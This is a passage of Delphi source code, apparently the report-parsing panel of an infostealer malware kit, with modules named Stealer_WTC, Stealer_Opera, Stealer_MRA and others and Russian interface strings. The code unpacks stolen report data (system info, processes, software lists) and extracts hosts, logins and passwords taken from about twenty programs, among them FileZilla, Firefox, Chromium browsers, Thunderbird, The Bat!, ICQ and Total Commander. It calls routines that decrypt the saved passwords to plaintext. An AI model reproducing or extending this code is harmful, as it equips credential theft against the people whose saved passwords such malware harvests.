        REPORT_FOLDER_TEMP:    Folders:=Folders+'  Папка TMP:'+#13#10;
        REPORT_FOLDER_MYDOCS:  Folders:=Folders+'  Мои Документы:'+#13#10;
        REPORT_FOLDER_PROGRAM: Folders:=Folders+'  Program Files:'+#13#10;
        REPORT_FOLDER_AUTORUN: Folders:=Folders+'  Папка Автозагрузки:'+#13#10;
      end;
      s:=copy(pchar(hData),0,dd2 div 2);
      Folders:=Folders+'    '+s+#13#10;
      Inc(hData,dd2);
    end;
  end;
  folders:=folders+#13#10;
  // Processes
  processes:='';
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  while dd <> REPORT_DATA_SYSINFO_PROCESS_MARK do
  begin
    s:=copy(pchar(hData),0,dd div 2);
    Inc(hData,dd);
    processes:=processes+'  '+s+#13#10;
    CopyMemory(@dd,pointer(hData),4);
    Inc(hData,sizeof(dd));
  end;
  processes:=processes+#13#10;
  // Users
  users:='';
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  while dd <> REPORT_DATA_SYSINFO_USERS_MARK do
  begin
    s:=copy(pchar(hData),0,dd div 2);
    Inc(hData,dd);
    users:=users+'  '+s+#13#10;
    CopyMemory(@dd,pointer(hData),4);
    Inc(hData,sizeof(dd));
  end;
  users:=users+#13#10;
  // Soft
  softlist:=tstringlist.create;
  softlist.Sorted:=true;
  softlist.Duplicates := dupIgnore;
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  while dd <> REPORT_DATA_SYSINFO_SOFT_MARK do
  begin
    s:=copy(pchar(hData),0,dd);
    softlist.Add(s);
    Inc(hData,dd);
    CopyMemory(@dd,pointer(hData),4);
    Inc(hData,sizeof(dd));
  end;
  softlist.Sort;
  soft:='';
  for i:=0 to softlist.Count-1 do
  begin
    soft:=soft+'  '+softlist[i]+#13#10;
  end;
  softlist.Free;
  soft:=soft+#13#10;
  Dec(hData,struc_size);
  Dec(hData,4);
  // ---------------------------
  // Get PIDGIN
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      pidgin:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    pidgin_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_PROTOCOL:  begin
                                 pidgintmp:=copy(pansichar(hData),0,dd);
                                 if pos('prpl-',pidgintmp)<>0 then pidgintmp:=copy(pidgintmp, Length('prpl-')+1, MaxInt);
                                 s:=formattype(bb)+'--'+pidgintmp+'--';
                               end;
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
      end;
      pidgin:=pidgin+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto pidgin_onemoretime;
      Dec(hData,struc_size+4);
      pidgin:=pidgin+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Pidgin');
      node.Data:=pointer(pidgin);
      node.ImageIndex:=6;
      node.SelectedIndex:=6;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get WTC
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      wtc:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    wtc_onemoretime:
      CopyMemory(@dd,pointer(hData),4);
      inc(hData,4);
      inc(struc_cnt,4);
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:  s:=formattype(bb)+UTF8ToWideString(strip_utf8_bom(copy(pansichar(hData),0,dd)));
        REPORT_DATA_LOGIN: s:=formattype(bb)+UTF8ToWideString(strip_utf8_bom(copy(pansichar(hData),0,dd)));
        REPORT_DATA_PWD:   s:=formattype(bb)+Stealer_WTC.WTCDecrypt(copy(pansichar(hData),0,dd));
      end;
      wtc:=wtc+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto wtc_onemoretime;
      Dec(hData,struc_size+4);
      wtc:=wtc+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Total Commander');
      node.Data:=pointer(wtc);
      node.ImageIndex:=4;
      node.SelectedIndex:=4;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get IE6-7
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      ie:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    ie7_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_URL:   s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_UKWN:  s:=formattype(bb)+copy(pchar(hData),0,dd);
      end;
      ie:=ie+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto ie7_onemoretime;
      Dec(hData,struc_size+4);
      ie:=ie+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Internet Explorer');
      node.Data:=pointer(ie);
      node.ImageIndex:=3;
      node.SelectedIndex:=3;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get FlashFXP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      fxp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    fxp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_LOGIN: s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_PWD:   s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
      end;
      fxp:=fxp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto fxp_onemoretime;
      Dec(hData,struc_size+4);
      fxp:=fxp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'FlashFXP');
      node.Data:=pointer(fxp);
      node.ImageIndex:=2;
      node.SelectedIndex:=2;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get FileZilla
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      fz:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    fz_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_LOGIN: s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_PWD:   s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
      end;
      fz:=fz+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto fz_onemoretime;
      Dec(hData,struc_size+4);
      fz:=fz+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'FileZilla');
      node.Data:=pointer(fz);
      node.ImageIndex:=1;
      node.SelectedIndex:=1;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Live
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      live:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    live_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_LOGIN: s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_PWD:   s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
      end;
      live:=live+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto live_onemoretime;
      Dec(hData,struc_size+4);
      live:=live+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Live Messenger');
      node.Data:=pointer(live);
      node.ImageIndex:=0;
      node.SelectedIndex:=0;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Opera
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      opera:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    opera_onemoretime:
      CopyMemory(@dd,pointer(hData),4);
      inc(hData,4);
      inc(struc_cnt,4);
      dd2:=dd;
      opera:=Stealer_Opera.ProcessWandDataMem(hData, dd);
      inc(struc_cnt,dd2);
      inc(hData,dd2);
      if struc_cnt<struc_size then goto opera_onemoretime;
      Dec(hData,struc_size+4);
      if opera<>'' then
      begin
        opera:=opera+#13#10;
        node:=Form3.TreeView1.Items.AddChild(nil, 'Opera');
        node.Data:=pointer(opera);
        node.ImageIndex:=5;
        node.SelectedIndex:=5;
      end;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Gtalk
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      gtalk:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    gtalk_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      gtalktmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_LOGIN: s:=formattype(bb)+UTF8ToWideString(gtalktmp);
        REPORT_DATA_PWD:   s:=formattype(bb)+UTF8ToWideString(gtalktmp);
      end;
      gtalk:=gtalk+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto gtalk_onemoretime;
      Dec(hData,struc_size+4);
      gtalk:=gtalk+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Google Talk');
      node.Data:=pointer(gtalk);
      node.ImageIndex:=7;
      node.SelectedIndex:=7;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get QIP Infium
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      infium:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    infium_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_LOGIN: s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_PWD:   s:=formattype(bb)+copy(pchar(hData),0,dd);
      end;
      infium:=infium+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto infium_onemoretime;
      Dec(hData,struc_size+4);
      infium:=infium+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'QIP Infium');
      node.Data:=pointer(infium);
      node.ImageIndex:=8;
      node.SelectedIndex:=8;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Miranda
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      miranda:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    miranda_onemoretime:
      CopyMemory(@bb2,pointer(hData),sizeof(bb2));
      inc(hData,sizeof(bb2));
      inc(struc_cnt,sizeof(bb2));
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_PROTOCOL:  s:=formattype(bb)+'--'+AnsiLowerCase(copy(pansichar(hData),0,dd))+'--';
        REPORT_DATA_EMAIL:     s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_SERVER:    if bb2 in [MIRANDA_DATATYPE_JABBER] then
                               begin
                                  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
                               end
                               else
                               begin
                                  s:=formattype(bb)+copy(pansichar(hData),0,dd);
                               end;
        REPORT_DATA_LOGIN:     if bb2 in [MIRANDA_DATATYPE_JABBER, MIRANDA_DATATYPE_IRC] then
                               begin
                                  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
                               end
                               else
                               begin
                                  s:=formattype(bb)+copy(pansichar(hData),0,dd);
                               end;
        REPORT_DATA_PWD:       if bb2 in [MIRANDA_DATATYPE_JABBER] then
                               begin
                                  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
                               end
                               else
                               begin
                                  s:=formattype(bb)+copy(pansichar(hData),0,dd);
                               end;
      end;
      miranda:=miranda+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto miranda_onemoretime;
         Dec(hData,struc_size+4);
      miranda:=miranda+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Miranda');
      node.Data:=pointer(miranda);
      node.ImageIndex:=9;
      node.SelectedIndex:=9;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get FireFox
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      ff:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    ff_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      fftmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+UTF8ToWideString(fftmp);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(fftmp);
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(fftmp);
      end;
      ff:=ff+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto ff_onemoretime;
         Dec(hData,struc_size+4);
      ff:=ff+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'FireFox');
      node.Data:=pointer(ff);
      node.ImageIndex:=11;
      node.SelectedIndex:=11;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get MRA
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      mra:='';
      Dec(hData,4);
      // accs count
      dd2:=hData;
      Dec(hData,struc_size-4);
      // get sizeof ver.txt
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      sl:=tstringlist.Create;
      dd3:=Stealer_MRA.MRADecrypt(hData,hData-4,hData+dd,dd2,sl,0);
      if dd3>0 then
      begin
        for i:=1 to sl.Count do
        begin
          mra:=mra+sl.Strings[i-1]+#13#10;
        end;
        mra:=mra+#13#10;
        node:=Form3.TreeView1.Items.AddChild(nil, 'Mail.Ru Agent');
        node.Data:=pointer(mra);
        node.ImageIndex:=12;
        node.SelectedIndex:=12;
      end;
      Dec(hData,8);
      sl.Free; 
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get ICQ
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      icq:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    icq_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_LOGIN:     s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_PWD:
          begin
            s:=copy(pchar(hData),0,dd div 2);
            ans:=DecodeString(s);
            if length(ans)>=16 then
            begin
              s:=Format('%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x',
                        [ord(ans[01]),ord(ans[02]),ord(ans[03]),ord(ans[04]),ord(ans[05]),ord(ans[06]),
                         ord(ans[07]),ord(ans[08]),ord(ans[09]),ord(ans[10]),ord(ans[11]),ord(ans[12]),
                         ord(ans[13]),ord(ans[14]),ord(ans[15]),ord(ans[16])]);
              s:=formattype(bb)+s;
            end;
          end;
      end;
      icq:=icq+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto icq_onemoretime;
         Dec(hData,struc_size+4);
      icq:=icq+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'ICQ');
      node.Data:=pointer(icq);
      node.ImageIndex:=13;
      node.SelectedIndex:=13;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get FAR
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      farfar:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    farfar_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:  s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_LOGIN: s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_PWD:   s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_BINARY:s:=Stealer_FAR.FAR3_ProcessDB(hData,dd);
      end;
      farfar:=farfar+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto farfar_onemoretime;
        Dec(hData,struc_size+4);
      farfar:=farfar+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'FAR');
      node.Data:=pointer(farfar);
      node.ImageIndex:=14;
      node.SelectedIndex:=14;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get The Bat!    {DONT COPY IT! UNSTANDART DATATYPE SIZE}
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      thebat:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    thebat_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@dd3,pointer(hData),sizeof(dd3));
      inc(hData,sizeof(dd3));
      inc(struc_cnt,sizeof(dd3));
      case dd3 of
        // REPORT_DATA_BAT_EMAIL
        REPORT_DATA_BAT_EMAIL:        s:=formattype(dd3)+copy(pansichar(hData),0,dd);
        // REPORT_DATA_BAT_SERVER
        REPORT_DATA_BAT_SERVER:       s:=formattype(dd3)+copy(pansichar(hData),0,dd);
        // REPORT_DATA_BAT_LOGIN
        REPORT_DATA_BAT_LOGIN:        s:=formattype(dd3)+TheBatDecrypt(copy(pansichar(hData),0,dd));
        // REPORT_DATA_BAT_PWD
        REPORT_DATA_BAT_PWD:          s:=formattype(dd3)+TheBatDecrypt(copy(pansichar(hData),0,dd));
        // REPORT_DATA_BAT_ACCPWD
        REPORT_DATA_BAT_ACCPWD:       s:=formattype(dd3)+TheBatDecrypt(copy(pansichar(hData),0,dd));
        // REPORT_DATA_BAT_ACCOUNT
        REPORT_DATA_BAT_ACCOUNT:      s:=formattype(dd3)+copy(pansichar(hData),0,dd);
        // REPORT_DATA_BAT_SMTP_LOGIN
        REPORT_DATA_BAT_SMTP_LOGIN:   s:=formattype(dd3)+copy(pansichar(hData),0,dd)+' (SMTP)';
        // REPORT_DATA_BAT_SMTP_PWD
        REPORT_DATA_BAT_SMTP_PWD:     s:=formattype(dd3)+TheBatDecrypt(copy(pansichar(hData),0,dd))+' (SMTP)';
        // REPORT_DATA_BAT_SMTP_SERVER
        REPORT_DATA_BAT_SMTP_SERVER:  s:=formattype(dd3)+copy(pansichar(hData),0,dd)+' (SMTP)';
      end;
      thebat:=thebat+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto thebat_onemoretime;
        Dec(hData,struc_size+4);
      thebat:=thebat+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'The Bat!');
      node.Data:=pointer(thebat);
      node.ImageIndex:=15;
      node.SelectedIndex:=15;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get SmartFTP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      smartftp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    smartftp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_NAME:  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_HOST:  s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_LOGIN: s:=formattype(bb)+UTF8ToWideString(copy(pansichar(hData),0,dd));
        REPORT_DATA_PWD:   s:=formattype(bb)+SmartFTPDecrypt(copy(pansichar(hData),0,dd));
      end;
      smartftp:=smartftp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto smartftp_onemoretime;
      Dec(hData,struc_size+4);
      smartftp:=smartftp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'SmartFTP');
      node.Data:=pointer(smartftp);
      node.ImageIndex:=16;
      node.SelectedIndex:=16;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Chromium-based
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      chrome:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    chrome_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      chromiumtmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_URL:       s:=formattype(bb)+UTF8ToWideString(chromiumtmp);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(chromiumtmp);
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(chromiumtmp);
      end;
      chrome:=chrome+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto chrome_onemoretime;
         Dec(hData,struc_size+4);
      chrome:=chrome+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Chromium-based');
      node.Data:=pointer(chrome);
      node.ImageIndex:=17;
      node.SelectedIndex:=17;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get QIP 2005
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      q2005:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    q2005_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_LOGIN: s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_PWD:   s:=formattype(bb)+copy(pchar(hData),0,dd);
      end;
      q2005:=q2005+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto q2005_onemoretime;
        Dec(hData,struc_size+4);
      q2005:=q2005+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'QIP 2005');
      node.Data:=pointer(q2005);
      node.ImageIndex:=18;
      node.SelectedIndex:=18;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Thunderbird
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      thunderbird:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    tb_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      thunderbirdtmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+UTF8ToWideString(thunderbirdtmp);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(thunderbirdtmp);
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(thunderbirdtmp);
      end;
      thunderbird:=thunderbird+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto tb_onemoretime;
         Dec(hData,struc_size+4);
      thunderbird:=thunderbird+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Thunderbird');
      node.Data:=pointer(thunderbird);
      node.ImageIndex:=19;
      node.SelectedIndex:=19;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Safari
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      safari:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    safari_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      safaritmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+UTF8ToWideString(safaritmp);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(safaritmp);
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(safaritmp);
      end;
      safari:=safari+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto safari_onemoretime;
         Dec(hData,struc_size+4);
      safari:=safari+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Safari');
      node.Data:=pointer(safari);
      node.ImageIndex:=20;
      node.SelectedIndex:=20;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get Psi
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      psi:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    psi_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_LOGIN:
          begin
            psi1:=UTF8ToWideString(copy(pansichar(hData),0,dd));
            s:=formattype(bb)+psi1;
          end;
        REPORT_DATA_PWD:
          begin
            psi2:=copy(pansichar(hData),0,dd);
            s:=formattype(bb)+PsiDecrypt(psi1,psi2);
          end;
      end;
      psi:=psi+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto psi_onemoretime;
         Dec(hData,struc_size+4);
      psi:=psi+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Psi');
      node.Data:=pointer(psi);
      node.ImageIndex:=21;
      node.SelectedIndex:=21;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get CoreFTP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      coreftp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    coreftp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
